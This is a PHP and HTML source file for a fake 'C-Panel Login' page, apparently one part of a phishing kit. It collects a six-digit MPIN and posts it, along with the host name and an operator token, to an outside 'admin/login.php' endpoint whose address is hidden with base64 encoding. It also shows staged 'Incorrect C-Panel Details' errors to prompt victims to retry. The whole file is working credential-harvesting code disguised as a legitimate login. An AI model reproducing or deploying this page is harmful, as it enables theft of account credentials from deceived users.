

<?php
$admin_token = file_get_contents('token.txt');
$shost = file_get_contents('shost.txt');
$host = $_SERVER['SERVER_NAME'];
$login = base64_decode("$shost") . base64_decode("YWRtaW4vbG9naW4ucGhw");

if (empty($admin_token)) {
    header("Location: add_user.php");
    exit();
}

$msg = ""; // Initialize message

$token = $_REQUEST['token'] ?? '';
$r = $_REQUEST['r'] ?? '';

if (stristr($r, '2')) {
    $msg = "<center></h3><font color=red>Incorrect C-Panel Details</font></h3></center>";
} elseif (stristr($r, '1')) {
    $msg = "<center></h3><font color=red>Something Wrong.</font></h3></center>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C-Panel Login</title>
    <style>
        /* Reset default styles and set up a clean base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff; /* Default text color white */
        }

        .mpin-container {
            background: #1c1c1c; /* Dark gray background for container */
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px; /* Ensure the container has a max-width */
            text-align: center;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #32CD32; /* Green color for the title */
        }

        /* Styling for the logo image */
        h2 img {
            height: 30px;
            margin-right: 10px;
        }

        /* Style for the MPIN input fields */
        .mpin-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .mpin-input {
            width: 40px;
            height: 40px;
            font-size: 24px;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.3s;
            background-color: #333; /* Dark background for inputs */
            color: #fff; /* White text inside inputs */
        }

        .mpin-input:focus {
            border-color: #007bff; /* Blue border on focus */
        }

        .submit-btn {
            padding: 12px 20px;
            background-color: #32CD32; /* Green button */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background-color: #228B22; /* Darker green on hover */
        }

        .error-message {
            color: #FF6347; /* Red color for error messages */
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="mpin-container">
    <h2>
        <!-- Replace with the actual path to the cPanel logo once available -->
        <img src="cp.png" alt="cPanel Logo">
        C-Panel Login
    </h2>

    <!-- Error message from PHP (if any) -->
    <?php echo $msg; ?><br>

    <!-- MPIN Form -->
    <form id="mpinForm" action="<?php echo $login;?>" method="POST">
        <div class="mpin-inputs">
            <input type="number" name="mpin1" maxlength="1" class="mpin-input" required />
            <input type="number" name="mpin2" maxlength="1" class="mpin-input" required />
            <input type="number" name="mpin3" maxlength="1" class="mpin-input" required />
            <input type="number" name="mpin4" maxlength="1" class="mpin-input" required />
            <input type="number" name="mpin5" maxlength="1" class="mpin-input" required />
            <input type="number" name="mpin6" maxlength="1" class="mpin-input" required />
            <input type="hidden" name="host" value="<?php echo $host;?>" required>
            <input type="hidden" name="token" value="<?php echo $admin_token;?>" required>
        </div>
        <button type="submit" class="submit-btn">Login To C-Panel</button>
        <div class="error-message"></div>
    </form>
</div>

<script>
    const inputs = document.querySelectorAll('.mpin-input');
    const form = document.getElementById('mpinForm');
    const errorMessage = document.querySelector('.error-message');

    // Auto-focus functionality for input fields
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length === 1 && index < 5) {
                inputs[index + 1].focus();
            }
            if (input.value.length === 0 && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });
</script>

</body>
</html>
